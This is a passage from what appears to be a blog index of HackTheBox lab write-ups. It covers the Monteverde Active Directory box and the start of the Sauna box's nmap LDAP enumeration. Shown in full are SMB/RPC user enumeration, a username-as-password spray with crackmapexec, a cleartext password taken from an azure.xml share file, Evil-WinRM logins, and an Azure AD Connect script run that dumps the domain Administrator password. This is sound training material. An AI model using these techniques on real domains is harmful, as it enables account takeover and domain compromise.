0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)     index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)     index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)      Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.     user:[Guest] rid:[0x1f5]     user:[AAD_987d7f2f57d2] rid:[0x450]     user:[mhope] rid:[0x641]     user:[SABatchJobs] rid:[0xa2a]     user:[svc-ata] rid:[0xa2b]     user:[svc-bexec] rid:[0xa2c]     user:[svc-netapp] rid:[0xa2d]     user:[dgalanos] rid:[0xa35]     user:[roleary] rid:[0xa36]     user:[smorgan] rid:[0xa37]     ===========================================      |    Share Enumeration on monteverde.htb    |     ===========================================      Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.     Sharename       Type      Comment     ---------       ----      -------     SMB1 disabled -- no workgroup available     [+] Attempting to map shares on monteverde.htb     ======================================================      |    Password Policy Information for monteverde.htb    |     ======================================================      [+] Attaching to monteverde.htb using a NULL share     [+] Trying protocol 139/SMB...     [!] Protocol failed: Cannot request session (Called Name:MONTEVERDE.HTB)     [+] Trying protocol 445/SMB...     [+] Found domain(s):     [+] MEGABANK     [+] Builtin     [+] Password Info for Domain: MEGABANK     [+] Minimum password length: 7     [+] Password history length: 24     [+] Maximum password age: 41 days 23 hours 53 minutes      [+] Password Complexity Flags: 000000     [+] Domain Refuse Password Change: 0     [+] Domain Password Store Cleartext: 0     [+] Domain Password Lockout Admins: 0     [+] Domain Password No Clear Change: 0     [+] Domain Password No Anon Change: 0     [+] Domain Password Complex: 0     [+] Minimum password age: 1 day 4 minutes      [+] Reset Account Lockout Counter: 30 minutes      [+] Locked Account Duration: 30 minutes      [+] Account Lockout Threshold: None     [+] Forced Log off Time: Not Set     Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.     [+] Retieved partial password policy with rpcclient:     Password Complexity: Disabled     Minimum Password Length: 7     ================================      |    Groups on monteverde.htb    |     ================================      Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.     [+] Getting builtin groups:     group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]     group:[Incoming Forest Trust Builders] rid:[0x22d]     group:[Windows Authorization Access Group] rid:[0x230]     group:[Terminal Server License Servers] rid:[0x231]     group:[Users] rid:[0x221]     group:[Guests] rid:[0x222]     group:[Remote Desktop Users] rid:[0x22b]     group:[Network Configuration Operators] rid:[0x22c]     group:[Performance Monitor Users] rid:[0x22e]     group:[Performance Log Users] rid:[0x22f]     group:[Distributed COM Users] rid:[0x232]     group:[IIS_IUSRS] rid:[0x238]     group:[Cryptographic Operators] rid:[0x239]     group:[Event Log Readers] rid:[0x23d]     group:[Certificate Service DCOM Access] rid:[0x23e]     group:[RDS Remote Access Servers] rid:[0x23f]     group:[RDS Endpoint Servers] rid:[0x240]     group:[RDS Management Servers] rid:[0x241]     group:[Hyper-V Administrators] rid:[0x242]     group:[Access Control Assistance Operators] rid:[0x243]     group:[Remote Management Users] rid:[0x244]     group:[Storage Replica Administrators] rid:[0x246]     ===========================================      |    Share Enumeration on monteverde.htb    |     ===========================================      Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.     Sharename       Type      Comment     ---------       ----      -------     SMB1 disabled -- no workgroup available     [+] Attempting to map shares on monteverde.htb     ======================================================      |    Password Policy Information for monteverde.htb    |     ======================================================      [+] Attaching to monteverde.htb using a NULL share     [+] Trying protocol 139/SMB...     [!] Protocol failed: Cannot request session (Called Name:MONTEVERDE.HTB)     [+] Trying protocol 445/SMB...     [+] Found domain(s):     [+] MEGABANK     [+] Builtin     [+] Password Info for Domain: MEGABANK     [+] Minimum password length: 7     [+] Password history length: 24     [+] Maximum password age: 41 days 23 hours 53 minutes      [+] Password Complexity Flags: 000000     [+] Domain Refuse Password Change: 0     [+] Domain Password Store Cleartext: 0     [+] Domain Password Lockout Admins: 0     [+] Domain Password No Clear Change: 0     [+] Domain Password No Anon Change: 0     [+] Domain Password Complex: 0     [+] Minimum password age: 1 day 4 minutes      [+] Reset Account Lockout Counter: 30 minutes      [+] Locked Account Duration: 30 minutes      [+] Account Lockout Threshold: None     [+] Forced Log off Time: Not Set     Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.     [+] Retieved partial password policy with rpcclient:     Password Complexity: Disabled     Minimum Password Length: 7     ================================      |    Groups on monteverde.htb    |     ================================      Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.     [+] Getting builtin groups:     group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]     group:[Incoming Forest Trust Builders] rid:[0x22d]     group:[Windows Authorization Access Group] rid:[0x230]     group:[Terminal Server License Servers] rid:[0x231]     group:[Users] rid:[0x221]     group:[Guests] rid:[0x222]     group:[Remote Desktop Users] rid:[0x22b]     group:[Network Configuration Operators] rid:[0x22c]     group:[Performance Monitor Users] rid:[0x22e]     group:[Performance Log Users] rid:[0x22f]     group:[Distributed COM Users] rid:[0x232]     group:[IIS_IUSRS] rid:[0x238]     group:[Cryptographic Operators] rid:[0x239]     group:[Event Log Readers] rid:[0x23d]     group:[Certificate Service DCOM Access] rid:[0x23e]     group:[RDS Remote Access Servers] rid:[0x23f]     group:[RDS Endpoint Servers] rid:[0x240]     group:[RDS Management Servers] rid:[0x241]     group:[Hyper-V Administrators] rid:[0x242]     group:[Access Control Assistance Operators] rid:[0x243]     group:[Remote Management Users] rid:[0x244]     group:[Storage Replica Administrators] rid:[0x246]     [+] Getting local groups:     group:[Cert Publishers] rid:[0x205]     group:[RAS and IAS Servers] rid:[0x229]     group:[Allowed RODC Password Replication Group] rid:[0x23b]     group:[Denied RODC Password Replication Group] rid:[0x23c]     group:[DnsAdmins] rid:[0x44d]     group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]     group:[ADSyncAdmins] rid:[0x451]     group:[ADSyncOperators] rid:[0x452]     group:[ADSyncBrowse] rid:[0x453]     group:[ADSyncPasswordSet] rid:[0x454]   Found a few users with the help of Enum4Linux.   So, to simplyfy the output I used RPCCLIENT for a detailed ennumeration.       rpcclient $&gt; enumdomusers      user:[Guest] rid:[0x1f5]     user:[AAD_987d7f2f57d2] rid:[0x450]     user:[mhope] rid:[0x641]     user:[SABatchJobs] rid:[0xa2a]     user:[svc-ata] rid:[0xa2b]     user:[svc-bexec] rid:[0xa2c]     user:[svc-netapp] rid:[0xa2d]     user:[dgalanos] rid:[0xa35]     user:[roleary] rid:[0xa36]     user:[smorgan] rid:[0xa37]   Quering all the users info using RPCCLIENT, I found that mhopes is the member of AZURE DOMAIN ADMIN’S.       rpcclient $&gt; enumdomgroups      group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]     group:[Domain Users] rid:[0x201]     group:[Domain Guests] rid:[0x202]     group:[Domain Computers] rid:[0x203]     group:[Group Policy Creator Owners] rid:[0x208]     group:[Cloneable Domain Controllers] rid:[0x20a]     group:[Protected Users] rid:[0x20d]     group:[DnsUpdateProxy] rid:[0x44e]     group:[Azure Admins] rid:[0xa29]     group:[File Server Admins] rid:[0xa2e]     group:[Call Recording Admins] rid:[0xa2f]     group:[Reception] rid:[0xa30]     group:[Operations] rid:[0xa31]     group:[Trading] rid:[0xa32]     group:[HelpDesk] rid:[0xa33]     group:[Developers] rid:[0xa34]                        rpcclient $&gt; queryuser 0x641     User Name   :   mhope     Full Name   :   Mike Hope     Home Drive  :   \\\\monteverde\\users$\\mhope     Dir Drive   :   H:     Profile Path:     Logon Script:     Description :     Workstations:     Comment     :     Remote Dial :     Logon Time               :      Fri, 12 Jun 2020 05:40:35 EDT     Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST     Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT     Password last set Time   :      Thu, 02 Jan 2020 18:40:06 EST     Password can change Time :      Fri, 03 Jan 2020 18:40:06 EST     Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT     unknown_2[0..31]...     user_rid :      0x641     group_rid:      0x201     acb_info :      0x00000210     fields_present: 0x00ffffff     logon_divs:     168     bad_password_count:     0x00000000     logon_count:    0x00000002     padding1[0..7]...     logon_hrs[0..21]...   So I quickly made the user list and tries with a different password list(s), But no luck unfortunately. A quick idea popped into my mind and then I used the same username list as the password list for the password spray using crackmapexec.  crackmapexec       SMB 10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)     SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\AAD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\mhope:SABatchJobs STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\mhope:mhope STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\mhope:svc-ata STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\mhope:svc-bexec STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\mhope:svc-netapp STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\mhope:dgalanos STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\mhope:roleary STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\\mhope:smorgan STATUS_LOGON_FAILURE      SMB 10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\\SABatchJobs:SABatchJobs    Cracking the password of SABatchJobs and using Evil-WinRM didn’t return anything! So I moved on trying with SMB.  SMBCLIENT       smbclient -L  monteverde.htb -U SABatchJobs     Enter WORKGROUP\\SABatchJobs's password:      Sharename       Type      Comment     ---------       ----      -------     ADMIN$          Disk      Remote Admin     azure_uploads   Disk           C$              Disk      Default share     E$              Disk      Default share     IPC$            IPC       Remote IPC     NETLOGON        Disk      Logon server share      SYSVOL          Disk      Logon server share      users$          Disk           SMB1 disabled -- no workgroup available                     smbclient //monteverde.htb/users$ -U SABatchJobs     Enter WORKGROUP\\SABatchJobs's password:      Try \"help\" to get a list of possible commands.     smb: \\&gt; ls     .                                   D        0  Fri Jan  3 08:12:48 2020     ..                                  D        0  Fri Jan  3 08:12:48 2020     dgalanos                            D        0  Fri Jan  3 08:12:30 2020     mhope                               D        0  Fri Jan  3 08:41:18 2020     roleary                             D        0  Fri Jan  3 08:10:30 2020     smorgan                             D        0  Fri Jan  3 08:10:24 2020     524031 blocks of size 4096\\. 519955 blocks available     smb: \\&gt; cd mhope     smb: \\mhope\\&gt; ls     .                                   D        0  Fri Jan  3 08:41:18 2020     ..                                  D        0  Fri Jan  3 08:41:18 2020     azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020     524031 blocks of size 4096\\. 519955 blocks available     smb: \\mhope\\&gt; get azure.xml     getting file \\mhope\\azure.xml of size 1212 as azure.xml (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)    Looking at AZURE.xml file, password of mhope is found!  Then using Evil-WinRM I was able to login as MHOPE.       cat azure.xml         &lt;t&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/t&gt;     &lt;t&gt;System.Object&lt;/t&gt;     &lt;tostring&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/tostring&gt;      &lt;dt n=\"StartDate\"&gt;2020-01-03T05:35:00.7562298-08:00&lt;/dt&gt;      &lt;dt n=\"EndDate\"&gt;2054-01-03T05:35:00.7562298-08:00&lt;/dt&gt;      &lt;g n=\"KeyId\"&gt;00000000-0000-0000-0000-000000000000&lt;/g&gt;     &lt;s n=\"Password\"&gt;4n0therD4y@n0th3r$&lt;/s&gt;    Getting user.txt       evil-winrm -i monteverde.htb -u mhope -p 4n0therD4y@n0th3r$      Evil-WinRM shell v2.3      Info: Establishing connection to remote endpoint      *Evil-WinRM* PS C:\\Users\\mhope\\Documents&gt; cd ..     *Evil-WinRM* PS C:\\Users\\mhope&gt; cd Desktop     *Evil-WinRM* PS C:\\Users\\mhope\\Desktop&gt; cat user.txt     [4961************************12f2]   Privilege Escalation       USER INFORMATION     ----------------     User Name      SID     ============== ============================================     megabank\\mhope S-1-5-21-391775091-850290835-3566037492-1601     GROUP INFORMATION     -----------------     Group Name                                  Type             SID                                          Attributes     =========================================== ================ ============================================ ==================================================     Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group     BUILTIN\\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group     BUILTIN\\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group     BUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group     NT AUTHORITY\\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group     NT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group     NT AUTHORITY\\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group     MEGABANK\\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group     NT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group     Mandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448     PRIVILEGES INFORMATION     ----------------------     Privilege Name                Description                    State     ============================= ============================== =======     SeMachineAccountPrivilege     Add workstations to domain     Enabled     SeChangeNotifyPrivilege       Bypass traverse checking       Enabled     SeIncreaseWorkingSetPrivilege Increase a process working set Enabled     USER CLAIMS INFORMATION     -----------------------     User claims unknown.     Kerberos support for Dynamic Access Control on this device has been disabled.    Seeing that [mhope] is a member of Azure Admin group [MEGABANK\\Azure Admins]. This means mhope must me having the administrator rights on the domain. Looking for the exploit in google for quite a good time I came across a [powershell] script [AzureConnect]. So this script will return the Administrator password in Cleartext format. So I created a new file [adconnect.ps1] with the powershell script in it and uploaded the script.       *Evil-WinRM* PS C:\\Users\\mhope\\Desktop&gt; upload adconnect.ps1     Info: Uploading adconnect.ps1 to C:\\Users\\mhope\\Desktop\\adconnect.ps1      Data: 2936 bytes of 2936 bytes copied     Info: Upload successful!      *Evil-WinRM* PS C:\\Users\\mhope\\Desktop&gt; dir     Directory: C:\\Users\\mhope\\Desktop     Mode                LastWriteTime         Length Name     ----                -------------         ------ ----     -a----        6/11/2020  11:04 PM           2202 adconnect.ps1     -ar---         1/3/2020   5:48 AM             32 user.txt`    This script needs to run in locally as I have a shell as mhope.  To have a more indepth view have a look on the below video.            *Evil-WinRM* PS C:\\Users\\mhope\\Desktop&gt; import-module ./adconnect.ps1     *Evil-WinRM* PS C:\\Users\\mhope\\Desktop&gt; ./adconnect.ps1     *Evil-WinRM* PS C:\\Users\\mhope\\Desktop&gt; Azure-ADConnect -server 127.0.0.1 -db ADSync     [+] Domain:  MEGABANK.LOCAL     [+] Username: administrator     [+]Password: d0m@in4dminyeah!    Getting root.txt   So, as I got the PASSWORD of Administrator, I can login as Administrator using Evil-WinRM and grab the root flag.       evil-winrm -i monteverde.htb -u Administrator -p d0m@in4dminyeah!      Evil-WinRM shell v2.3     Info: Establishing connection to remote endpoint      *Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cd ..     *Evil-WinRM* PS C:\\Users\\Administrator&gt; cd Desktop     *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt; cat root.txt     [1290************************a0bc]     *Evil-WinRM* PS C:\\Users\\Administrator\\Desktop&gt;    And we get the shell as administrator      If you like my work, please do consider giving me +rep on HACKTHEBOX.   My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968  ","categories": ["hackthebox"],
        "tags": ["windows,","activedirectory,","evilwinrm,","hashcat,","impacket,","crackmapexec,","rpcclient"],
        "url": "/hackthebox/Monteverde/",
        "teaser": "/assets/img/sample/mont.png"
      },{
        "title": "HackTheBox Sauna",
        "excerpt":"As always hacking starts with NMAP scan.   Nmap 7.80 scan initiated Sat Apr  4 05:52:33 2020 as: nmap -sV -A -o nmap.sauna 10.10.10.175 Nmap scan report for 10.10.10.175 Host is up (0.20s latency). Not shown: 988 filtered ports PORT     STATE SERVICE       VERSION 53/tcp   open  domain? | fingerprint-strings:  |   DNSVersionBindReqTCP:  |     version |_    bind 80/tcp   open  http          Microsoft IIS httpd 10.0 | http-methods:  |_  Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-04 16:53:10Z) 135/tcp  open  msrpc         Microsoft Windows RPC 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn 389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp  open  microsoft-ds? 464/tcp  open  kpasswd5? 593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 636/tcp  open  tcpwrapped 3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open  tcpwrapped 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=4/4%Time=5E885906%P=x86_64-pc-linux-gnu%r(DNSVe SF:rsionBindReqTCP,20,\"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\x SF:04bind\\0\\0\\x10\\0\\x03\"); Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Network Distance: 2 hops Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows  Host script results: |_clock-skew: 7h00m03s | smb2-security-mode:  |   2.02:  |_    Message signing enabled and required | smb2-time:  |   date: 2020-04-04T16:55:52 |_  start_date: N/A  TRACEROUTE (using port 445/tcp) HOP RTT       ADDRESS 1   197.16 ms 10.10.14.1 2   198.35 ms 10.10.10.175  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Apr  4 05:58:29 2020 -- 1 IP address (1 host up) scanned in 356.97 seconds     Using NMAP to see any users can be found in the domain.   Nmap 7.80 scan initiated Sat Apr  4 06:13:39 2020 as: nmap -n -sV -script *ldap* -p 389 -oA script.ldap 10.10.10.175 Nmap scan report for 10.10.10.175 Host is up (0.20s latency).  PORT    STATE SERVICE VERSION 389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name) | ldap-brute:  |   root: &lt;empty&gt;=&gt; Valid credentials |   admin: &lt;empty&gt;=&gt; Valid credentials |   administrator: &lt;empty&gt;=&gt; Valid credentials |   webadmin: &lt;empty&gt;=&gt; Valid credentials |   sysadmin: &lt;empty&gt;=&gt; Valid credentials |   netadmin: &lt;empty&gt;=&gt; Valid credentials |   guest: &lt;empty&gt;=&gt; Valid credentials |   user: &lt;empty&gt;=&gt; Valid credentials |   web: &lt;empty&gt;=&gt; Valid credentials |_  test: &lt;empty&gt;=&gt; Valid credentials | ldap-rootdse:  | LDAP Results |   &lt;root&gt;|       domainFunctionality: 7 |       forestFunctionality: 7 |       domainControllerFunctionality: 7 |       rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL |       ldapServiceName: EGOTISTICAL-BANK.LOCAL:sauna$@EGOTISTICAL-BANK.LOCAL |       isGlobalCatalogReady: TRUE |       supportedSASLMechanisms: GSSAPI |       supportedSASLMechanisms: GSS-SPNEGO |       supportedSASLMechanisms: EXTERNAL |       supportedSASLMechanisms: DIGEST-MD5 |       supportedLDAPVersion: 3 |       supportedLDAPVersion: 2 |       supportedLDAPPolicies: MaxPoolThreads |       supportedLDAPPolicies: MaxPercentDirSyncRequests |       supportedLDAPPolicies: MaxDatagramRecv |       supportedLDAPPolicies: MaxReceiveBuffer |       supportedLDAPPolicies: InitRecvTimeout |       supportedLDAPPolicies: MaxConnections |       supportedLDAPPolicies: MaxConnIdleTime |       supportedLDAPPolicies: MaxPageSize |       supportedLDAPPolicies: MaxBatchReturnMessages |       supportedLDAPPolicies: MaxQueryDuration |       supportedLDAPPolicies: MaxDirSyncDuration |       supportedLDAPPolicies: MaxTempTableSize |       supportedLDAPPolicies: MaxResultSetSize |       supportedLDAPPolicies: MinResultSets |       supportedLDAPPolicies: MaxResultSetsPerConn |       supportedLDAPPolicies: MaxNotificationPerConn |       supportedLDAPPolicies: MaxValRange |       supportedLDAPPolicies: MaxValRangeTransitive |       supportedLDAPPolicies: ThreadMemoryLimit |       supportedLDAPPolicies: SystemMemoryLimitPercent |       supportedControl: 1.2.840.113556.1.4.319 |       supportedControl: 1.2.840.113556.1.4.801 |       supportedControl: 1.2.840.113556.1.4.473 |       supportedControl: 1.2.840.113556.1.4.528 |       supportedControl: 1.2.840.113556.1.4.417 |       supportedControl: 1.2.840.113556.1.4.619 |       supportedControl: 1.2.840.113556.1.4.841 |       supportedControl: 1.2.840.113556.1.4.529 |       supportedControl: 1.2.840.113556.1.4.805 |       supportedControl: 1.2.840.113556.1.4.521 |       supportedControl: 1.2.840.113556.1.4.970 |       supportedControl: 1.2.840.113556.1.4.1338 |       supportedControl: 1.2.840.113556.1.4.474 |       supportedControl: 1.2.840.113556.1.4.1339 |       supportedControl: 1.2.840.113556.1.4.1340 |       supportedControl: 1.2.840.113556.1.4.1413 |       supportedControl: 2.16.840.1.113730.3.4.9 |       supportedControl: 2.16.840.1.113730.3.4.10 |       supportedControl: 1.2.840.113556.1.4.1504 |       supportedControl: 1.2.840.113556.1.4.1852 |       supportedControl: 1.2.840.113556.1.4.802 |       supportedControl: 1.2.840.113556.1.4.1907 |       supportedControl: 1.2.840.113556.1.4.1948 |       supportedControl: 1.2.840.113556.1.4.1974 |       supportedControl: 1.2.840.113556.1.4.1341 |       supportedControl: 1.2.840.113556.1.4.2026 |       supportedControl: 1.2.840.113556.1.4.2064 |       supportedControl: 1.2.840.113556.1.4.2065 |       supportedControl: 1.2.840.113556.1.4.2066 |       supportedControl: 1.2.840.113556.1.4.2090 |       supportedControl: 1.2.840.113556.1.4.2205 |       supportedControl: 1.2.840.113556.1.4.2204 |       supportedControl: 1.2.840.113556.1.4.2206 |       supportedControl: 1.2.840.113556.1.4.2211 |       supportedControl: 1.2.840.113556.1.4.2239 |       supportedControl: 1.2.840.113556.1.4.2255 |       supportedControl: 1.2.840.113556.1.4.2256 |       supportedControl: 1.2.840.113556.1.4.2309 |       supportedControl: 1.2.840.113556.1.4.2330 |       supportedControl: 1.2.840.113556.1.4.2354 |       supportedCapabilities: 1.2.840.113556.1.4.800 |       supportedCapabilities: 1.2.840.113556.1.4.1670 |       supportedCapabilities: 1.2.840.113556.1.4.1791 |       supportedCapabilities: 1.2.840.113556.1.4.1935 |       supportedCapabilities: 1.2.840.113556.1.4.2080 |       supportedCapabilities: 1.2.840.113556.1.4.2237 |       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL |       serverName: CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL |       schemaNamingContext: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL |       namingContexts: DC=EGOTISTICAL-BANK,DC=LOCAL |       namingContexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL |       namingContexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL |       namingContexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL |       namingContexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL |       isSynchronized: TRUE |       highestCommittedUSN: 53385 |       dsServiceName: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL |       dnsHostName: SAUNA.EGOTISTICAL-BANK.LOCAL |       defaultNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL |       currentTime: 20200404171356.0Z |_      configurationNamingContext: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL | ldap-search:  |   Context: DC=EGOTISTICAL-BANK,DC=LOCAL |     dn: DC=EGOTISTICAL-BANK,DC=LOCAL |         objectClass: top |         objectClass: domain |         objectClass: domainDNS |         distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL |         instanceType: 5 |         whenCreated: 2020/01/23 05:44:25 UTC |         whenChanged: 2020/04/03 23:33:53 UTC |         subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL |         subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL |         subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL |         uSNCreated: 4099 |         dSASignature: \\x01\\x00\\x00\\x00(\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00@\\xBE\\xE0\\xB3\\xC6%\\xECD\\xB2\\xB9\\x9F\\xF8\\D\\xB2\\xEC |         uSNChanged: 53269 |         name: EGOTISTICAL-BANK |         objectGUID: 504e6ec-c122-a143-93c0-cf487f83363 |         replUpToDateVector: \\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xFDZ\\x85\\x92F\\xDE^A\\xAAVnj@#\\xF6\\x0C\\x0B\\xD0\\x00\\x00\\x00\\x00\\x00\\x00\\xDFX\\x98\\x14\\x03\\x00\\x00\\x00@\\xBE\\xE0\\xB3\\xC6%\\xECD\\xB2\\xB9\\x9F\\xF8\\D\\xB2\\xEC\t\\xB0\\x00\\x00\\x00\\x00\\x00\\x00\\xD4\\x04R\\x14\\x03\\x00\\x00\\x00 |         creationTime: 132304304332325407 |         forceLogoff: -9223372036854775808 |         lockoutDuration: -18000000000 |         lockOutObservationWindow: -18000000000 |         lockoutThreshold: 0 |         maxPwdAge: -36288000000000 |         minPwdAge: -864000000000 |         minPwdLength: 7 |         modifiedCountAtLastProm: 0 |         nextRid: 1000 |         pwdProperties: 1 |         pwdHistoryLength: 24 |         objectSid: 1-5-21-2966785786-3096785034-1186376766 |         serverState: 1 |         uASCompat: 1 |         modifiedCount: 1 |         auditingPolicy: \\x00\\x01 |         nTMixedDomain: 0 |         rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL |         fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL |         systemFlags: -1946157056 |         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL |         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL |         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL |         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL |         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=EGOTISTICAL-BANK,DC=LOCAL |         wellKnownObjects: 